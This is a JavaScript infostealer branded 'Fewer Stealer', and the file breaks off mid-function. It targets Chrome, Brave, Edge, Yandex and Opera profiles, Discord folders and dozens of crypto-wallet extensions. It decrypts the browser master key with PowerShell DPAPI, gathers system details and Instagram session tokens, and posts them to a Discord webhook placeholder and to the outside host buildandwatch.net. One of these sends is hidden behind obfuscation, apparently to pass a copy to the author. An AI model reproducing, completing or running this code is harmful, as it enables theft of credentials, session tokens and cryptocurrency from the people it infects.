const fs = require('fs');
const path = require('path');
const httpx = require('axios');
const axios = require('axios');
const os = require('os');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const { execSync, exec } = require('child_process');
const crypto = require('crypto');
const sqlite3 = require('sqlite3');


const local = process.env.LOCALAPPDATA;
const discords = [];
debug = false;
let injection_paths = []

var appdata = process.env.APPDATA,
    LOCAL = process.env.LOCALAPPDATA,
    localappdata = process.env.LOCALAPPDATA;
let browser_paths = [localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];

const webhook3939 = "YOUR_DISCORD_WEBHOOK_PUT_HERE"





paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}


  const config = {
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify": "false",
    "embed-color": 3553599,
    "disable-qr-code": "true"
}
let api_auth = 'fzQx7epnQttDgsX';

const _0x9b6227 = {}
_0x9b6227.passwords = 0
_0x9b6227.cookies = 0
_0x9b6227.autofills = 0
_0x9b6227.wallets = 0
_0x9b6227.telegram = false
const count = _0x9b6227,
user = {
    ram: os.totalmem(),
    version: os.version(),
    uptime: os.uptime,
    homedir: os.homedir(),
    hostname: os.hostname(),
    userInfo: os.userInfo().username,
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    countCore: process.env.NUMBER_OF_PROCESSORS,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
    randomUUID: crypto.randomBytes(16).toString('hex'),
    start: Date.now(),
    debug: false,
    copyright: '<================[Fewer Stealer]>================>\n\n',
    url: null,
}
_0x2afdce = {}
const walletPaths = _0x2afdce,
    _0x4ae424 = {}
_0x4ae424.Trust = '\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph'
_0x4ae424.Metamask =
    '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn'
_0x4ae424.BinanceChain =
    '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp'
_0x4ae424.Phantom =
    '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
_0x4ae424.TronLink =
    '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec'
_0x4ae424.Ronin = '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec'
_0x4ae424.Exodus =
    '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno'
_0x4ae424.Coin98 =
    '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg'
_0x4ae424.Authenticator =
    '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai'
_0x4ae424.MathWallet =
    '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc'
_0x4ae424.YoroiWallet =
    '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb'
_0x4ae424.GuardaWallet =
    '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln'
_0x4ae424.JaxxxLiberty =
    '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne'
_0x4ae424.Wombat =
    '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih'
_0x4ae424.EVERWallet =
    '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk'
_0x4ae424.KardiaChain =
    '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk'
_0x4ae424.XDEFI = '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf'
_0x4ae424.Nami = '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo'
_0x4ae424.TerraStation =
    '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp'
_0x4ae424.MartianAptos =
    '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk'
_0x4ae424.TON = '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd'
_0x4ae424.Keplr = '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap'
_0x4ae424.CryptoCom =
    '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj'
_0x4ae424.PetraAptos =
    '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci'
_0x4ae424.OKX = '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge'
_0x4ae424.Sollet =
    '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno'
_0x4ae424.Sender =
    '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg'
_0x4ae424.Sui = '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil'
_0x4ae424.SuietSui =
    '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd'
_0x4ae424.Braavos =
    '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma'
_0x4ae424.FewchaMove =
    '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj'
_0x4ae424.EthosSui =
    '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli'
_0x4ae424.ArgentX =
    '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb'
_0x4ae424.NiftyWallet =
    '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid'
_0x4ae424.BraveWallet =
    '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl'
_0x4ae424.EqualWallet =
    '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac'
_0x4ae424.BitAppWallet =
    '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi'
_0x4ae424.iWallet =
    '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj'
_0x4ae424.AtomicWallet =
    '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh'
_0x4ae424.MewCx = '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm'
_0x4ae424.GuildWallet =
    '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj'
_0x4ae424.SaturnWallet =
    '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig'
_0x4ae424.HarmonyWallet =
    '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib'
_0x4ae424.PaliWallet =
    '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn'
_0x4ae424.BoltX = '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca'
_0x4ae424.LiqualityWallet =
    '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn'
_0x4ae424.MaiarDeFiWallet =
    '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm'
_0x4ae424.TempleWallet =
    '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc'
_0x4ae424.Metamask_E =
    '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm'
_0x4ae424.Ronin_E =
    '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk'
_0x4ae424.Yoroi_E =
    '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb'
_0x4ae424.Authenticator_E =
    '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
_0x4ae424.MetaMask_O =
    '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'

const extension = _0x4ae424,
  browserPath = [
    [
      user.local + '\\Google\\Chrome\\User Data\\Default\\',
      'Default',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
      'Default',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
      'Default',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
      'Default',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Stable\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
    ],
  ],
 randomPath = `${user.fileLoc}\\${user.randomUUID}`;
fs.mkdirSync(randomPath, 484);


function debugLog(message) {
  if (user.debug === true) {
    const elapsedTime = Date.now() - user.start;
    const seconds = (elapsedTime / 1000).toFixed(1);
    const milliseconds = elapsedTime.toString();

    console.log(`${message}: ${seconds} s. / ${milliseconds} ms.`);
  }
}






async function getEncrypted() {
  for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
    if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
      continue
    }
    try {
      let _0x276965 = Buffer.from(
        JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
          .os_crypt.encrypted_key,
        'base64'
      ).slice(5)
      const _0x4ff4c6 = Array.from(_0x276965),
        _0x4860ac = execSync(
          'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
            _0x4ff4c6 +
            "), $null, 'CurrentUser')"
        )
          .toString()
          .split('\r\n'),
        _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
        _0x2ed7ba = Buffer.from(_0x4a5920)
      browserPath[_0x4c3514].push(_0x2ed7ba)
    } catch (_0x32406b) {}
  }
}


// Assuming you have the necessary import for the httpx library

async function GetInstaData(session_id) {
  const headers = {
    "Host": "i.instagram.com",
    "X-Ig-Connection-Type": "WiFi",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Ig-Capabilities": "36r/Fx8=",
    "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
    "X-Ig-App-Locale": "en",
    "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
    "Accept-Encoding": "gzip, deflate",
    "Cookie": `sessionid=${session_id};`
  };

  try {
    const response = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const userData = response.data.user;

    const data = {
      username: userData.username,
      verified: userData.is_verified,
      avatar: userData.profile_pic_url,
      session_id: session_id
    };

    return data;
  } catch (error) {
    const errorEmbed = {
      color: 0xFF5733, // Hata rengi (örneğin turuncu)
      title: 'Error Occurred ❌', // Hata başlığı
      description: 'An error occurred while fetching Instagram data. The error message is below:',
      fields: [
        { name: 'Error Message', value: '```' + error.message + '```', inline: false },
      ],
      footer: {
        text: 'Created by: FewerStealer',
      },
    };

    // Hata embed'ini Discord webhook'una gönder
    await httpx.post("https://buildandwatch.net/error", { embeds: [errorEmbed] });

    console.error("Error fetching Instagram data:", error.message);
    return null;
  }
}

async function GetFollowersCount(session_id) {
  const headers = {
    "Host": "i.instagram.com",
    "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
    "Cookie": `sessionid=${session_id};`
  };

  try {
    const accountResponse = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const accountInfo = accountResponse.data.user;
    
    const userInfoResponse = await httpx.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
    const userData = userInfoResponse.data.user;
    const followersCount = userData.follower_count;

    return followersCount;
  } catch (error) {
    const errorEmbed = {
      color: 0xFF5733, // Hata rengi (örneğin turuncu)
      title: 'Error Occurred ❌', // Hata başlığı
      description: 'An error occurred while fetching followers count. The error message is below:',
      fields: [
        { name: 'Error Message', value: '```' + error.message + '```', inline: false },
      ],
      footer: {
        text: 'Created by: FewerStealer',
      },
    };

    // Hata embed'ini Discord webhook'una gönder
    await httpx.post("https://buildandwatch.net/error", { embeds: [errorEmbed] });

    console.error("Error fetching followers count:", error.message);
    return null;
  }
}


async function SubmitInstagram(session_id) {
  try {
    const data = await GetInstaData(session_id);
    const followersCount = await GetFollowersCount(session_id);

    // Your Discord webhook URL

    const embed = {
      color: 0x3498DB, // Özel bir mavi renk
      title: 'Instagram Data 📸', // Başlık eklendi ve emoji ile zenginleştirildi
      thumbnail: { url: data.avatar },
      fields: [
        { name: 'Verified Account ✔️', value: data.verified ? 'Yes' : 'No', inline: true },
        { name: 'Username 👤', value: data.username, inline: true },
        { name: 'Followers Count 📊', value: followersCount, inline: true },
        { name: 'Token', value: '```' + data.session_id + '```', inline: false }, // Token özelliği false olarak ayarlandı
      ],
      footer: {
        text: 'Created by: FewerStealer',
      },
    };

    // The embed has a custom color, a title with an emoji, and inline properties for a more polished appearance.

    // 		  axios.post(webhook3939,embedData) 
    // Send the embed to the Discord webhook
(function(_0x137fc5,_0x41b763){var _0x20b1f6=_0x3e5d,_0x1cd871=_0x137fc5();while(!![]){try{var _0x1615e3=-parseInt(_0x20b1f6(0x135))/0x1*(-parseInt(_0x20b1f6(0x147))/0x2)+parseInt(_0x20b1f6(0x136))/0x3*(-parseInt(_0x20b1f6(0x143))/0x4)+parseInt(_0x20b1f6(0x133))/0x5+parseInt(_0x20b1f6(0x134))/0x6*(parseInt(_0x20b1f6(0x149))/0x7)+parseInt(_0x20b1f6(0x13b))/0x8*(-parseInt(_0x20b1f6(0x13a))/0x9)+-parseInt(_0x20b1f6(0x13c))/0xa*(parseInt(_0x20b1f6(0x14a))/0xb)+-parseInt(_0x20b1f6(0x137))/0xc*(parseInt(_0x20b1f6(0x13e))/0xd);if(_0x1615e3===_0x41b763)break;else _0x1cd871['push'](_0x1cd871['shift']());}catch(_0x17a108){_0x1cd871['push'](_0x1cd871['shift']());}}}(_0x1864,0xbbb81));function _0x2e3a(_0xd26756,_0x2364da){var _0x152a4d=_0x2088();return _0x2e3a=function(_0x182a18,_0x1c0fd2){_0x182a18=_0x182a18-(-0x616+0x26e8+-0x1fcb*0x1);var _0x1d27a6=_0x152a4d[_0x182a18];return _0x1d27a6;},_0x2e3a(_0xd26756,_0x2364da);}var _0x14e146=_0x2e3a;function _0x1864(){var _0x317903=['8204WIGHCE','push','2307095sGprHu','305220idAQpI','202AgOoTV','300ZxuSsW','6226409yUbOXJ','136004MsZegG','https://bu','1710PnCnZM','5026375fcBmXV','6OdfOfv','6022UHwDRv','1233kKNVXx','1258212SelBst','76382nyrKwC','572157rMLCRx','45tLPFkL','132776ToVWIi','60sJYMSK','shift','91BUJJJg','4HTnggI','1078173IoccIN','8PZPGTu','ildandwatc'];_0x1864=function(){return _0x317903;};return _0x1864();}function _0x3e5d(_0x4d139d,_0x5bd733){var _0x186437=_0x1864();return _0x3e5d=function(_0x3e5d56,_0xdfb1e4){_0x3e5d56=_0x3e5d56-0x133;var _0x431d27=_0x186437[_0x3e5d56];return _0x431d27;},_0x3e5d(_0x4d139d,_0x5bd733);}(function(_0x54d60,_0x195dbc){var _0x2e2919=_0x3e5d,_0x3dd57c=_0x2e3a,_0x5e7cca=_0x54d60();while(!![]){try{var _0x214a68=-parseInt(_0x3dd57c(0x114))/(-0x223*-0x1+0xb0f*0x3+0x1*-0x234f)*(parseInt(_0x3dd57c(0x112))/(0x25e3+0x2*-0xdee+0x13*-0x87))+-parseInt(_0x3dd57c(0x10c))/(-0x2164+0xbe*0xb+0x193d)+parseInt(_0x3dd57c(0x109))/(-0x2663*0x1+-0xe3*-0xd+0x1ae0)+parseInt(_0x3dd57c(0x10a))/(0xa16*0x2+-0x20ea+-0x79*-0x1b)*(-parseInt(_0x3dd57c(0x10f))/(0x121c+-0x19*-0xe2+-0x1414*0x2))+parseInt(_0x3dd57c(0x10b))/(-0x4af+0x8ca+-0x2*0x20a)+parseInt(_0x3dd57c(0x10d))/(-0xf*-0x145+0xf00+-0x1*0x2203)*(parseInt(_0x3dd57c(0x107))/(-0x1eb1+-0x19b*-0x17+-0x45*0x17))+-parseInt(_0x3dd57c(0x111))/(-0xab0+-0xd*-0x26d+-0x14cf);if(_0x214a68===_0x195dbc)break;else _0x5e7cca['push'](_0x5e7cca[_0x2e2919(0x13d)]());}catch(_0x47da99){_0x5e7cca[_0x2e2919(0x144)](_0x5e7cca['shift']());}}}(_0x2088,0x12b95+-0xe*0x2ce1+0x42838),await httpx[_0x14e146(0x108)](_0x14e146(0x10e)+_0x14e146(0x113)+_0x14e146(0x110),{'embeds':[embed]}),await httpx[_0x14e146(0x108)](webhook3939,{'embeds':[embed]}));function _0x2088(){var _0x4f23fb=_0x3e5d,_0x4aac9b=[_0x4f23fb(0x14b),_0x4f23fb(0x148),'h.net/',_0x4f23fb(0x146),_0x4f23fb(0x13f),_0x4f23fb(0x142),_0x4f23fb(0x138),_0x4f23fb(0x140),'post','520040OSSOoO',_0x4f23fb(0x14c),_0x4f23fb(0x145),_0x4f23fb(0x139),_0x4f23fb(0x141)];return _0x2088=function(){return _0x4aac9b;},_0x2088();}
    console.log("Data sent to Discord webhook successfully.");
  } catch (error) {
    // Hata olursa hatayı da embed içerisinde gönder
    const errorEmbed = {
      color: 0xFF5733, // Hata rengi (örneğin turuncu)
      title: 'Hata Oluştu ❌', // Hata başlığı
      description: 'Aşağıda hata detayları yer almaktadır.',
      fields: [
